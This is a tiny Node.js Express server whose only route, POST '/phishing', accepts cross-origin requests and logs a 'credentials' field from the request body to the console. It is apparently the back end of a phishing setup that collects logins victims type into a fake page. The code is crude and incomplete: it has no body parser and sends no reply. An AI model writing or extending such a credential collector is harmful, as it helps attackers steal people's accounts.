const express = require('express')
const cors = require('cors')

const app = express()

app.use(cors())

app.post('/phishing', (req, res) => {
    const body = req.body
    console.log(body.credentials)
})


app.listen(3000, () => {
    console.log('Server running at 3000')
})